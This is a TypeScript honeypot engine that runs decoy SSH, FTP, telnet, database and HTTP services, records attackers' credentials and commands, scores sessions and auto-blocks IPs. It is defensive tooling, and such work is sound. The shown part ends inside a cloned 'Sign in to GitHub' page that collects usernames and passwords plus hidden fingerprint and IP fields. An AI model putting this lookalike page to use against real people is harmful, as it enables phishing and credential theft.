import crypto from "node:crypto";
import net from "node:net";
import express from "express";
import type { Response } from "express";
import {
  type AlertRecord,
  type AttackSession,
  type AttackerProfile,
  type ClassificationLabel,
  type CorrelationRecord,
  type DashboardSnapshot,
  type HoneypotEvent,
  type HoneypotService,
  type ServiceStatus,
  type SeverityLevel,
} from "@shared/honeypot";
import { deliverAlert } from "./alerts";
import {
  honeypotConfig,
  type HoneypotConfig,
  type ServiceDefinition,
} from "./config";
import {
  type DetectionContext,
  evaluateSession,
  extractThreatIntel,
} from "./detection";
import { addSseClient, broadcast, removeSseClient } from "./liveEvents";
import { lookupGeoProfile } from "./geoip";
import { appendEvidence, loadState, saveState, type PersistedState } from "./storage";

const nowIso = () => new Date().toISOString();

const normalizeIp = (ip: string | undefined) =>
  (ip || "0.0.0.0").replace(/^::ffff:/, "");

const isPrivateOrLocalIp = (ip: string) =>
  /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|169\.254\.|100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.|::1$|fc00:|fd00:|fe80:|localhost$)/i.test(
    ip
  );

const toCandidateIps = (raw: string | undefined) =>
  String(raw || "")
    .split(",")
    .map((part) => normalizeIp(part.trim()))
    .filter((ip) => ip && net.isIP(ip));

const pickBestAttackerIp = (inputs: Array<string | undefined>) => {
  const candidates = inputs.flatMap(toCandidateIps);
  const firstPublic = candidates.find((ip) => !isPrivateOrLocalIp(ip));
  if (firstPublic) return firstPublic;
  return candidates[0] || "0.0.0.0";
};

const severityRank: Record<SeverityLevel, number> = {
  low: 1,
  medium: 2,
  high: 3,
  critical: 4,
};

const emptyServiceCounts = () => ({
  ssh: 0,
  ftp: 0,
  telnet: 0,
  http: 0,
  database: 0,
});

const emptyClassificationCounts = (): Record<ClassificationLabel, number> => ({
  reconnaissance: 0,
  brute_force: 0,
  web_probe: 0,
  malware_drop_attempt: 0,
  bot_activity: 0,
  privilege_escalation_attempt: 0,
  credential_stuffing: 0,
  lateral_movement: 0,
  unknown: 0,
});

const hourBucket = (iso: string) => iso.slice(0, 13);

const dedupe = (items: string[]) => Array.from(new Set(items.filter(Boolean)));

const serializeBody = (body: unknown) => {
  if (!body) return "";
  if (typeof body === "string") return body;
  try {
    return JSON.stringify(body);
  } catch {
    return String(body);
  }
};

const makeSession = async (
  service: HoneypotService,
  destinationPort: number,
  attackerIp: string,
  sourcePort: number,
  protocol: "tcp" | "http",
  config: HoneypotConfig
): Promise<AttackSession> => {
  const geo = await lookupGeoProfile(attackerIp, config.geoIpEnabled);
  const timestamp = nowIso();

  return {
    id: crypto.randomUUID(),
    attackerIp,
    sourcePort,
    service,
    destinationPort,
    protocol,
    startedAt: timestamp,
    lastActivityAt: timestamp,
    durationMs: 0,
    status: "active",
    classification: "unknown",
    severity: "low",
    severityScore: 0,
    usernameAttempts: [],
    passwordAttempts: [],
    commands: [],
    payloads: [],
    requestedPaths: [],
    responseActions: [],
    transcript: [],
    threatSignals: [],
    indicators: {
      ips: [attackerIp],
      usernames: [],
      urls: [],
      commands: [],
      payloadPatterns: [],
      hashes: [],
    },
    geo,
    asnProfile: `${geo.asn} ${geo.org}`.trim(),
    alertIds: [],
    correlationNotes: [],
    failureCount: 0,
  };
};

export class HoneypotEngine {
  private readonly config: HoneypotConfig;
  private readonly state: PersistedState;
  private readonly tcpServers = new Map<HoneypotService, net.Server>();
  private httpServer?: ReturnType<express.Express["listen"]>;
  private readonly liveSockets = new Map<string, net.Socket>();
  private readonly activeSessionIds = new Set<string>();
  private readonly sessionIndex = new Map<string, AttackSession>();
  private readonly serviceStatus = new Map<HoneypotService, ServiceStatus>();
  private readonly correlationWindowMs = 15 * 60 * 1000;

  constructor(config: HoneypotConfig) {
    this.config = config;
    this.state = loadState();

    for (const definition of config.services) {
      const existing = this.state.services.find(
        (service) => service.service === definition.service
      );
      this.serviceStatus.set(definition.service, {
        service: definition.service,
        port: definition.port,
        enabled: definition.enabled,
        listening: existing?.listening ?? false,
        activeConnections: 0,
        totalConnections: existing?.totalConnections ?? 0,
        banner: definition.banner,
      });
    }

    for (const session of this.state.sessions) {
      this.sessionIndex.set(session.id, session);
    }

    this.syncServices();
  }

  private syncServices() {
    this.state.services = Array.from(this.serviceStatus.values());
    saveState(this.state);
  }

  private persist() {
    this.state.services = Array.from(this.serviceStatus.values());
    saveState(this.state);
  }

  private recentSessionsByIp(ip: string) {
    const floor = Date.now() - this.correlationWindowMs;
    return this.state.sessions.filter((session) => {
      if (session.attackerIp !== ip) return false;
      return new Date(session.lastActivityAt).getTime() >= floor;
    });
  }

  private buildDetectionContext(session: AttackSession): DetectionContext {
    const recent = this.recentSessionsByIp(session.attackerIp);
    return {
      recentSessionsFromIp: recent,
      uniqueServicesFromIp: dedupe(recent.map((entry) => entry.service)) as HoneypotService[],
      recentConnectionBurst: recent.length,
    };
  }

  private updateSessionSeverity(session: AttackSession) {
    session.indicators = extractThreatIntel(session);
    const evaluation = evaluateSession(
      session,
      this.buildDetectionContext(session)
    );
    session.threatSignals = evaluation.signals;
    session.classification = evaluation.classification;
    session.severity = evaluation.severity;
    session.severityScore = evaluation.severityScore;
    session.correlationNotes = evaluation.correlationNotes;
  }

  private registerEvent(
    session: AttackSession,
    category: HoneypotEvent["category"],
    summary: string,
    severity: SeverityLevel,
    details?: string
  ) {
    const event: HoneypotEvent = {
      id: crypto.randomUUID(),
      sessionId: session.id,
      timestamp: nowIso(),
      attackerIp: session.attackerIp,
      service: session.service,
      destinationPort: session.destinationPort,
      category,
      summary,
      severity,
      details,
      signalIds: session.threatSignals.map((signal) => signal.id),
    };
    this.state.events.push(event);
    this.state.events = this.state.events.slice(-800);
    appendEvidence(this.state, "event", event);
    broadcast({
      type: "event",
      category,
      service: session.service,
      ip: session.attackerIp,
      summary,
      severity,
      details,
    });
  }

  private pushFrame(
    session: AttackSession,
    direction: "in" | "out" | "meta",
    kind: "banner" | "auth" | "command" | "payload" | "http" | "system",
    content: string
  ) {
    session.lastActivityAt = nowIso();
    session.transcript.push({
      id: crypto.randomUUID(),
      at: session.lastActivityAt,
      direction,
      kind,
      content,
    });
  }

  private async onHighRisk(session: AttackSession, socket?: net.Socket) {
    if (session.severityScore >= this.config.autoBlockThreshold) {
      this.blockIp(
        session.attackerIp,
        `Auto-blocked from ${session.classification} on ${session.service}`
      );
    }

    if (severityRank[session.severity] >= severityRank.high && session.alertIds.length === 0) {
      await this.createAlert(session);
    }

    if (
      socket &&
      this.config.terminateHighRisk &&
      severityRank[session.severity] >= severityRank.high
    ) {
      session.status = "terminated";
      session.responseActions.push("Connection terminated after high-risk detection.");
      this.registerEvent(
        session,
        "response_action",
        "Socket terminated",
        session.severity,
        "Immediate connection cut triggered by IDS threshold."
      );
      socket.end("421 Session terminated by security monitor.\r\n");
    }
  }

  private async createAlert(session: AttackSession) {
    const alert: AlertRecord = {
      id: crypto.randomUUID(),
      createdAt: nowIso(),
      sessionId: session.id,
      attackerIp: session.attackerIp,
      service: session.service,
      severity: session.severity,
      title: `[${session.severity.toUpperCase()}] ${session.classification.replaceAll("_", " ")} from ${session.attackerIp}`,
      message: `Service ${session.service} on port ${session.destinationPort}. Score ${session.severityScore}. Signals: ${session.threatSignals
        .map((signal) => signal.label)
        .join(", ") || "none"}.`,
      classification: session.classification,
      channels: ["dashboard"],
      delivered: [],
    };

    alert.delivered = await deliverAlert(alert, this.config);
    alert.channels = dedupe(["dashboard", ...alert.delivered]);
    this.state.alerts.unshift(alert);
    this.state.alerts = this.state.alerts.slice(0, 150);
    session.alertIds.push(alert.id);
    this.registerEvent(session, "alert", alert.title, session.severity, alert.message);
    appendEvidence(this.state, "alert", alert);
  }

  async createSession(
    service: HoneypotService,
    destinationPort: number,
    attackerIp: string,
    sourcePort: number,
    protocol: "tcp" | "http",
    socket?: net.Socket
  ) {
    const session = await makeSession(
      service,
      destinationPort,
      attackerIp,
      sourcePort,
      protocol,
      this.config
    );

    this.state.sessions.unshift(session);
    this.state.sessions = this.state.sessions.slice(0, 400);
    this.sessionIndex.set(session.id, session);
    this.activeSessionIds.add(session.id);

    const serviceStatus = this.serviceStatus.get(service);
    if (serviceStatus) {
      serviceStatus.totalConnections += 1;
      serviceStatus.activeConnections += 1;
    }

    this.registerEvent(session, "connection_opened", "Session opened", "low");
    this.persist();

    if (this.isBlocked(session.attackerIp) && socket) {
      session.status = "terminated";
      session.responseActions.push("Blocked IP rejected at connect time.");
      socket.end("554 Access denied.\r\n");
      this.finalizeSession(session.id);
    }

    return session;
  }

  finalizeSession(sessionId: string) {
    const session = this.sessionIndex.get(sessionId);
    if (!session || !this.activeSessionIds.has(sessionId)) {
      return;
    }

    session.lastActivityAt = nowIso();
    session.durationMs =
      new Date(session.lastActivityAt).getTime() -
      new Date(session.startedAt).getTime();
    if (session.status === "active") {
      session.status = "closed";
    }
    session.endedAt = session.lastActivityAt;
    this.updateSessionSeverity(session);
    this.registerEvent(
      session,
      "connection_closed",
      "Session closed",
      session.severity
    );
    appendEvidence(this.state, "session", session);
    this.activeSessionIds.delete(sessionId);

    const serviceStatus = this.serviceStatus.get(session.service);
    if (serviceStatus) {
      serviceStatus.activeConnections = Math.max(
        0,
        serviceStatus.activeConnections - 1
      );
    }

    this.persist();
  }

  private async inspect(session: AttackSession, socket?: net.Socket) {
    this.updateSessionSeverity(session);
    this.persist();
    await this.onHighRisk(session, socket);
  }

  async recordCredential(
    sessionId: string,
    username: string,
    password?: string,
    socket?: net.Socket
  ) {
    const session = this.sessionIndex.get(sessionId);
    if (!session) return;

    if (username) session.usernameAttempts.push(username);
    if (password) session.passwordAttempts.push(password);
    if (password !== undefined) {
      session.failureCount += 1;
    }
    this.pushFrame(
      session,
      "in",
      "auth",
      `username=${username || "-"} password=${password || "-"}`
    );
    this.registerEvent(
      session,
      "login_attempt",
      `Credential attempt against ${session.service}`,
      "medium"
    );
    await this.inspect(session, socket);
  }

  async recordCommand(sessionId: string, command: string, socket?: net.Socket) {
    const session = this.sessionIndex.get(sessionId);
    if (!session) return;
    session.commands.push(command);
    this.pushFrame(session, "in", "command", command);
    this.registerEvent(session, "command", "Command captured", "medium", command);
    await this.inspect(session, socket);
  }

  async recordPayload(sessionId: string, payload: string, socket?: net.Socket) {
    const session = this.sessionIndex.get(sessionId);
    if (!session) return;
    session.payloads.push(payload);
    this.pushFrame(session, "in", "payload", payload);
    this.registerEvent(
      session,
      "payload",
      "Payload captured",
      "medium",
      payload.slice(0, 200)
    );
    await this.inspect(session, socket);
  }

  async recordWebRequest(
    sessionId: string,
    requestSummary: {
      method: string;
      path: string;
      userAgent?: string;
      body?: string;
      query?: string;
    }
  ) {
    const session = this.sessionIndex.get(sessionId);
    if (!session) return;
    session.requestedPaths.push(requestSummary.path);
    if (requestSummary.userAgent) {
      session.payloads.push(`ua=${requestSummary.userAgent}`);
    }
    if (requestSummary.body) {
      session.payloads.push(requestSummary.body);
    }
    const description = `${requestSummary.method} ${requestSummary.path}${
      requestSummary.query ? `?${requestSummary.query}` : ""
    }`;
    this.pushFrame(session, "in", "http", description);
    this.registerEvent(
      session,
      "web_request",
      "HTTP probe captured",
      "medium",
      description
    );
    await this.inspect(session);
  }

  async recordInteraction(
    sessionId: string,
    action: string,
    details?: string,
    socket?: net.Socket
  ) {
    const session = this.sessionIndex.get(sessionId);
    if (!session) return;
    session.responseActions.push(`UI:${action}`);
    this.pushFrame(session, "in", "system", `ui:${action}${details ? ` ${details}` : ""}`);
    this.registerEvent(
      session,
      "web_request",
      `UI interaction: ${action}`,
      "low",
      details
    );
    await this.inspect(session, socket);
  }

  isBlocked(ip: string) {
    return this.state.blockedIps.includes(ip);
  }

  blockIp(ip: string, reason = "Manual block") {
    if (!this.state.blockedIps.includes(ip)) {
      this.state.blockedIps.unshift(ip);
      this.state.blockedIps = this.state.blockedIps.slice(0, 300);
    }

    const latest = this.state.sessions.find((session) => session.attackerIp === ip);
    if (latest) {
      latest.responseActions.push(`IP blacklisted. ${reason}`);
      this.registerEvent(
        latest,
        "response_action",
        "IP added to blocklist",
        latest.severity,
        reason
      );
    }

    this.persist();
  }

  unblockIp(ip: string) {
    this.state.blockedIps = this.state.blockedIps.filter((entry) => entry !== ip);
    this.persist();
  }

  terminateSession(sessionId: string) {
    const socket = this.liveSockets.get(sessionId);
    if (socket) {
      socket.end("421 Session terminated by admin.\r\n");
      this.liveSockets.delete(sessionId);
    }
    const session = this.sessionIndex.get(sessionId);
    if (session) {
      session.status = "terminated";
      session.responseActions.push("Admin terminated session.");
      this.registerEvent(
        session,
        "response_action",
        "Session terminated by admin",
        session.severity
      );
    }
    this.finalizeSession(sessionId);
  }

  getSnapshot(): DashboardSnapshot {
    const sessions = this.state.sessions
      .slice()
      .sort((a, b) => +new Date(b.lastActivityAt) - +new Date(a.lastActivityAt));
    const events = this.state.events
      .slice()
      .sort((a, b) => +new Date(b.timestamp) - +new Date(a.timestamp));
    const alerts = this.state.alerts
      .slice()
      .sort((a, b) => +new Date(b.createdAt) - +new Date(a.createdAt));

    const attackersMap = new Map<string, AttackerProfile>();
    for (const session of sessions) {
      const current =
        attackersMap.get(session.attackerIp) ||
        {
          ip: session.attackerIp,
          geo: session.geo,
          firstSeen: session.startedAt,
          lastSeen: session.lastActivityAt,
          sessionCount: 0,
          eventCount: 0,
          alertCount: 0,
          totalSeverityScore: 0,
          preferredService: session.service,
          services: emptyServiceCounts(),
          classifications: emptyClassificationCounts(),
          topUsernames: [],
          behaviorPatterns: [],
        };

      current.firstSeen =
        new Date(session.startedAt) < new Date(current.firstSeen)
          ? session.startedAt
          : current.firstSeen;
      current.lastSeen =
        new Date(session.lastActivityAt) > new Date(current.lastSeen)
          ? session.lastActivityAt
          : current.lastSeen;
      current.sessionCount += 1;
      current.eventCount += events.filter((event) => event.sessionId === session.id).length;
      current.alertCount += session.alertIds.length;
      current.totalSeverityScore += session.severityScore;
      current.services[session.service] += 1;
      current.classifications[session.classification] += 1;
      current.topUsernames = dedupe(
        current.topUsernames.concat(session.usernameAttempts)
      ).slice(0, 5);
      current.behaviorPatterns = dedupe(
        current.behaviorPatterns
          .concat(session.correlationNotes)
          .concat(session.threatSignals.map((signal) => signal.label))
      ).slice(0, 5);
      current.preferredService =
        Object.entries(current.services).sort((a, b) => b[1] - a[1])[0]?.[0] as HoneypotService;
      attackersMap.set(session.attackerIp, current);
    }

    const timelineMap = new Map<string, number>();
    const failedLoginsMap = new Map<string, number>();
    const serviceDistribution = new Map<string, number>();
    const topPorts = new Map<string, number>();
    const severityDistribution = new Map<string, number>();
    const classificationDistribution = new Map<string, number>();

    for (const event of events) {
      timelineMap.set(hourBucket(event.timestamp), (timelineMap.get(hourBucket(event.timestamp)) || 0) + 1);
      serviceDistribution.set(event.service, (serviceDistribution.get(event.service) || 0) + 1);
      topPorts.set(String(event.destinationPort), (topPorts.get(String(event.destinationPort)) || 0) + 1);
      severityDistribution.set(event.severity, (severityDistribution.get(event.severity) || 0) + 1);
      const session = this.sessionIndex.get(event.sessionId);
      if (session) {
        classificationDistribution.set(
          session.classification,
          (classificationDistribution.get(session.classification) || 0) + 1
        );
      }
      if (event.category === "login_attempt") {
        failedLoginsMap.set(
          hourBucket(event.timestamp),
          (failedLoginsMap.get(hourBucket(event.timestamp)) || 0) + 1
        );
      }
    }

    const correlation: CorrelationRecord[] = sessions
      .filter((session) => session.correlationNotes.length > 0)
      .slice(0, 20)
      .map((session) => ({
        id: session.id,
        attackerIp: session.attackerIp,
        createdAt: session.lastActivityAt,
        stages: session.correlationNotes,
        severity: session.severity,
      }));

    const attackers = Array.from(attackersMap.values())
      .sort((a, b) => b.totalSeverityScore - a.totalSeverityScore)
      .slice(0, 12);

    const services = Array.from(this.serviceStatus.values()).sort(
      (a, b) => a.port - b.port
    );
    const metrics = {
      totalSessions: sessions.length,
      activeSessions: sessions.filter((session) => session.status === "active").length,
      totalEvents: events.length,
      totalAlerts: alerts.length,
      blockedIps: this.state.blockedIps.length,
      uniqueAttackers: attackersMap.size,
      averageSeverityScore:
        sessions.length > 0
          ? Number(
              (
                sessions.reduce((sum, session) => sum + session.severityScore, 0) /
                sessions.length
              ).toFixed(1)
            )
          : 0,
    };

    return {
      capturedAt: nowIso(),
      metrics,
      services,
      recentSessions: sessions.slice(0, this.config.snapshotLimit),
      alerts: alerts.slice(0, 30),
      attackers,
      events: events.slice(0, 80),
      correlation,
      blockedIps: this.state.blockedIps.slice(0, 50),
      analytics: {
        timeline: Array.from(timelineMap.entries())
          .sort((a, b) => a[0].localeCompare(b[0]))
          .slice(-24)
          .map(([bucket, count]) => ({ bucket, count })),
        topPorts: Array.from(topPorts.entries())
          .sort((a, b) => b[1] - a[1])
          .slice(0, 8)
          .map(([label, value]) => ({ label, value })),
        serviceDistribution: Array.from(serviceDistribution.entries()).map(([label, value]) => ({
          label,
          value,
        })),
        failedLoginsByHour: Array.from(failedLoginsMap.entries())
          .sort((a, b) => a[0].localeCompare(b[0]))
          .slice(-24)
          .map(([bucket, count]) => ({ bucket, count })),
        severityDistribution: Array.from(severityDistribution.entries()).map(([label, value]) => ({
          label,
          value,
        })),
        classificationDistribution: Array.from(classificationDistribution.entries())
          .sort((a, b) => b[1] - a[1])
          .map(([label, value]) => ({ label, value })),
      },
      isolation: this.config.isolation,
    };
  }

  getSession(sessionId: string) {
    return this.sessionIndex.get(sessionId) || null;
  }

  private setupSocketLifecycle(session: AttackSession, socket: net.Socket) {
    this.liveSockets.set(session.id, socket);

    const cleanup = () => {
      this.liveSockets.delete(session.id);
      this.finalizeSession(session.id);
    };

    socket.on("close", cleanup);
    socket.on("end", cleanup);
    socket.on("error", cleanup);
  }

  private async startTcpService(definition: ServiceDefinition) {
    if (!definition.enabled || definition.service === "http") {
      return;
    }

    const server = net.createServer(async (socket) => {
      const attackerIp = normalizeIp(socket.remoteAddress);
      const session = await this.createSession(
        definition.service,
        definition.port,
        attackerIp,
        socket.remotePort || 0,
        "tcp",
        socket
      );

      this.setupSocketLifecycle(session, socket);
      socket.setEncoding("utf8");
      this.pushFrame(session, "out", "banner", definition.banner);
      socket.write(`${definition.banner}\r\n`);

      let lastUser = "";
      let awaitingPassword = false;
      let interactiveShell = false;
      const service = definition.service;
      if (service === "ssh" || service === "telnet") {
        socket.write("login as: ");
      }
      if (service === "database") {
        socket.write("mysql> ");
      }

      socket.on("data", async (chunk) => {
        const lines = String(chunk)
          .split(/\r?\n/)
          .map((line) => line.trim())
          .filter(Boolean);

        for (const line of lines) {
          if (service === "ftp") {
            const [command, ...rest] = line.split(" ");
            const value = rest.join(" ").trim();
            const upper = command.toUpperCase();
            this.pushFrame(session, "in", "command", line);
            if (upper === "USER") {
              lastUser = value;
              await this.recordCredential(session.id, value, undefined, socket);
              socket.write("331 Password required\r\n");
            } else if (upper === "PASS") {
              await this.recordCredential(session.id, lastUser, value, socket);
              socket.write("530 Login incorrect\r\n");
            } else {
              await this.recordCommand(session.id, line, socket);
              socket.write("200 Command okay\r\n");
            }
            continue;
          }

          if (service === "database") {
            await this.recordCommand(session.id, line, socket);
            socket.write("ERROR 1064 (42000): syntax error near input\r\nmysql> ");
            continue;
          }

          if (interactiveShell) {
            await this.recordCommand(session.id, line, socket);
            socket.write(`${lastUser || "operator"}@edge-gateway:~$ `);
            continue;
          }

          if (!awaitingPassword) {
            lastUser = line;
            awaitingPassword = true;
            await this.recordCredential(session.id, line, undefined, socket);
            socket.write("password: ");
            continue;
          }

          await this.recordCredential(session.id, lastUser, line, socket);
          interactiveShell = true;
          socket.write("Last login: Tue Apr 9 02:14:01 UTC 2026 from 10.0.0.14\r\n");
          socket.write(`${lastUser || "operator"}@edge-gateway:~$ `);
          awaitingPassword = false;
        }
      });
    });

    server.listen(definition.port, () => {
      const status = this.serviceStatus.get(definition.service);
      if (status) {
        status.listening = true;
        this.persist();
      }
      console.log(`[honeypot] ${definition.service} listening on ${definition.port}`);
    });

    server.on("error", (error) => {
      const status = this.serviceStatus.get(definition.service);
      if (status) {
        status.listening = false;
        this.persist();
      }
      console.error(`[honeypot] ${definition.service} failed`, error);
    });

    this.tcpServers.set(definition.service, server);
  }

  private async startHttpService(definition: ServiceDefinition) {
    if (!definition.enabled) {
      return;
    }

    const app = express();
    app.disable("x-powered-by");
    app.set("trust proxy", true);
    app.use(this.createTrapRouter());

    this.httpServer = app.listen(definition.port, () => {
      const status = this.serviceStatus.get("http");
      if (status) {
        status.listening = true;
        this.persist();
      }
      console.log(`[honeypot] http decoy listening on ${definition.port}`);
    });

    this.httpServer.on("error", (error) => {
      const status = this.serviceStatus.get("http");
      if (status) {
        status.listening = false;
        this.persist();
      }
      console.error("[honeypot] http decoy failed", error);
    });
  }

  private renderTrapHtml() {
    return `<!doctype html>
<html lang="en" data-color-mode="dark" data-dark-theme="dark">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Sign in to GitHub · GitHub</title>
    <style>
      :root {
        --bg: #0d1117;
        --bg-2: #161b22;
        --panel: #161b22;
        --panel-2: #0d1117;
        --ink: #e6edf3;
        --muted: #7d8590;
        --line: #30363d;
        --line-muted: #21262d;
        --brand: #238636;
        --brand-hover: #2ea043;
        --brand-2: #58a6ff;
        --warn: #f59e0b;
        --btn-bg: #21262d;
        --btn-hover: #30363d;
        --shadow: rgba(0,0,0,0.3);
      }
      *, *::before, *::after { box-sizing: border-box; }
      html, body { min-height: 100%; }
      body {
        margin: 0;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif;
        font-size: 14px;
        line-height: 1.5;
        background-color: var(--bg);
        color: var(--ink);
      }
      a { color: var(--brand-2); text-decoration: none; }
      a:hover { text-decoration: underline; }

      /* ── Header ── */
      .gh-header {
        padding: 16px 32px;
        display: flex;
        align-items: center;
        justify-content: space-between;
        border-bottom: 1px solid var(--line-muted);
        background: var(--bg);
      }
      .gh-header-logo { display: flex; align-items: center; gap: 8px; }
      .gh-header-logo svg { fill: var(--ink); }
      .gh-header-nav { display: flex; gap: 20px; font-size: 14px; color: var(--muted); }
      .gh-header-nav a { color: var(--muted); }
      .gh-header-nav a:hover { color: var(--ink); text-decoration: none; }

      /* ── Container ── */
      .gh-container { max-width: 340px; margin: 40px auto; padding: 0 16px; }

      /* ── Auth box ── */
      .gh-logo-center { text-align: center; margin-bottom: 16px; }
      .gh-logo-center svg { fill: var(--ink); }
      .gh-box {
        background: var(--panel);
        border: 1px solid var(--line);
        border-radius: 6px;
        padding: 20px;
        margin-bottom: 16px;
      }
      .gh-box h1 {
        font-size: 20px;
        font-weight: 300;
        text-align: center;
        margin: 0 0 16px;
        color: var(--ink);
      }
      .gh-field { margin-bottom: 14px; }
      .gh-field label {
        display: block;
        font-weight: 600;
        font-size: 14px;
        margin-bottom: 6px;
        color: var(--ink);
      }
      .gh-field .field-header { display: flex; justify-content: space-between; align-items: center; }
      .gh-field .forgot { font-size: 12px; font-weight: 400; }
      .gh-input {
        width: 100%;
        padding: 5px 12px;
        font-size: 16px;
        line-height: 20px;
        height: 32px;
        color: var(--ink);
        background: var(--panel-2);
        border: 1px solid var(--line);
        border-radius: 6px;
        outline: none;
        transition: border-color .15s, box-shadow .15s;
      }
      .gh-input:focus { border-color: var(--brand-2); box-shadow: 0 0 0 3px rgba(88,166,255,.3); }
      .gh-btn-primary {
        display: block; width: 100%;
        padding: 5px 16px; height: 32px;
        font-size: 14px; font-weight: 500; line-height: 20px;
        background: var(--brand); color: #fff;
        border: 1px solid rgba(240,246,252,.1);
        border-radius: 6px; cursor: pointer;
        transition: background .15s;
        margin-top: 8px;
      }
      .gh-btn-primary:hover { background: var(--brand-hover); }
      .gh-btn-secondary {
        display: flex; align-items: center; justify-content: center; gap: 8px;
        width: 100%; padding: 5px 16px; height: 32px;
        font-size: 14px; font-weight: 500;
        background: var(--btn-bg); color: var(--ink);
        border: 1px solid rgba(240,246,252,.1);
        border-radius: 6px; cursor: pointer;
        transition: background .15s;
      }
      .gh-btn-secondary:hover { background: var(--btn-hover); }
      .gh-divider {
        display: flex; align-items: center; gap: 8px;
        margin: 16px 0; font-size: 12px; color: var(--muted);
      }
      .gh-divider::before, .gh-divider::after { content: ""; flex: 1; border-top: 1px solid var(--line); }

      /* ── Signup box ── */
      .gh-signup-box {
        border: 1px solid var(--line);
        border-radius: 6px;
        padding: 16px;
        text-align: center;
        font-size: 14px;
      }

      /* ── Repo bait card ── */
      .gh-repo-card {
        background: var(--panel);
        border: 1px solid var(--line);
        border-radius: 6px;
        padding: 14px 16px;
        margin-top: 16px;
      }
      .gh-repo-card .repo-name { font-weight: 600; color: var(--brand-2); font-size: 14px; }
      .gh-repo-card .repo-desc { color: var(--muted); font-size: 12px; margin-top: 4px; }
      .gh-repo-card .repo-meta { display: flex; gap: 16px; margin-top: 10px; font-size: 12px; color: var(--muted); align-items: center; }
      .lang-dot { width: 12px; height: 12px; border-radius: 50%; background: #f1e05a; display: inline-block; vertical-align: middle; margin-right: 4px; }
      .lock-icon { opacity: .6; }

      /* ── Status banner ── */
      .gh-status {
        background: rgba(56,139,253,.08);
        border: 1px solid rgba(56,139,253,.2);
        border-radius: 6px;
        padding: 8px 12px;
        margin-bottom: 16px;
        font-size: 12px;
        color: var(--brand-2);
        display: flex;
        align-items: center;
        gap: 8px;
      }
      .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #3fb950; box-shadow: 0 0 8px #3fb950; flex-shrink: 0; }

      /* ── Sponsor badge (tiny decorative ad) ── */
      .sponsor-badge {
        position: fixed;
        bottom: 16px; right: 16px;
        background: var(--panel);
        border: 1px solid var(--line);
        border-radius: 6px;
        padding: 5px 10px;
        font-size: 11px;
        color: var(--muted);
        display: flex;
        align-items: center;
        gap: 5px;
        cursor: pointer;
        transition: border-color .15s;
        z-index: 10;
      }
      .sponsor-badge:hover { border-color: #db61a2; }
      .sponsor-badge .heart { fill: #db61a2; }
      .sponsor-badge strong { color: var(--ink); }

      /* ── Footer ── */
      .gh-footer {
        margin-top: 40px; padding: 20px 16px;
        text-align: center;
        font-size: 12px;
        color: var(--muted);
        border-top: 1px solid var(--line-muted);
      }
      .gh-footer a { color: var(--muted); margin: 0 5px; }
      .gh-footer a:hover { color: var(--brand-2); text-decoration: none; }

      /* hidden tracking nodes */
      .sr-only { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0,0,0,0); }
    </style>
  </head>
  <body>

    <header class="gh-header">
      <div class="gh-header-logo">
        <svg height="32" viewBox="0 0 16 16" width="32" aria-hidden="true">
          <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/>
        </svg>
      </div>
      <nav class="gh-header-nav">
        <a href="#">Product</a>
        <a href="#">Solutions</a>
        <a href="#">Open Source</a>
        <a href="#">Pricing</a>
      </nav>
    </header>

    <div class="gh-container">

      <div class="gh-status">
        <span class="status-dot"></span>
        <span>All systems operational</span>
        <span id="sseStatus" style="margin-left:auto;opacity:.7">connecting…</span>
      </div>

      <div class="gh-logo-center">
        <svg height="48" viewBox="0 0 16 16" width="48" aria-hidden="true">
          <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/>
        </svg>
      </div>

      <div class="gh-box">
        <h1>Sign in to GitHub</h1>

        <form method="post" action="/auth" id="signinForm">
          <div class="gh-field">
            <label for="gh-username">Username or email address</label>
            <input id="gh-username" class="gh-input" name="username" type="text" autocomplete="username" autofocus />
          </div>
          <div class="gh-field">
            <div class="field-header">
              <label for="gh-password">Password</label>
              <a href="#" class="forgot">Forgot password?</a>
            </div>
            <input id="gh-password" class="gh-input" name="password" type="password" autocomplete="current-password" />
          </div>
          <input name="fingerprint" id="fingerprint" type="hidden" />
          <input name="publicIp" id="publicIp" type="hidden" />
          <button class="gh-btn-primary" type="submit">Sign in</button>
        </form>

        <div class="gh-divider">or</div>

        <button class="gh-btn-secondary" type="button" id="passkeyBtn">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true">
